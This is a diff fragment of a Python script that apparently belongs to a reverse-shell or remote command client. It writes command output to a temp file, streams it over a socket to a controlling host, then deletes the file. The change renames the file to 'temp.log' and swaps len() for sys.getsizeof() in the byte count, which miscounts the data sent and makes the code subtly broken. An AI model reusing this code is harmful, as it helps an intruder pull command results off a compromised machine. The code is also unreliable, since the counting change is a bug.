@@ -62,22 +62,23 @@ while True:
             # Send back the output
             client.send(str(sendsize).encode())
 
-            fw = open(file='temp', mode='wb')
+            fw = open(file='temp.log', mode='wb')
+            # print("Created temp file")
             fw.write(getOutput)
             fw.close()
 
-            f = open(file='temp', mode='rb')
+            f = open(file='temp.log', mode='rb')
             bytesToSend = f.read(1024)
             client.send(bytesToSend)
-            totalSent = len(bytesToSend)
+            totalSent = sys.getsizeof(bytesToSend)
             while totalSent < sendsize:
                 bytesToSend = f.read(8192)
                 totalSent = totalSent + len(bytesToSend)
                 client.send(bytesToSend)
             f.close()
-            os.remove('temp')
+            os.remove(os.path.join(os.getcwd(), 'temp.log'))
+            # print("Removed temp file")
 
 # client.close()
 print(f'[INFO] {SERVER_HOST} disconnected.')
-
 
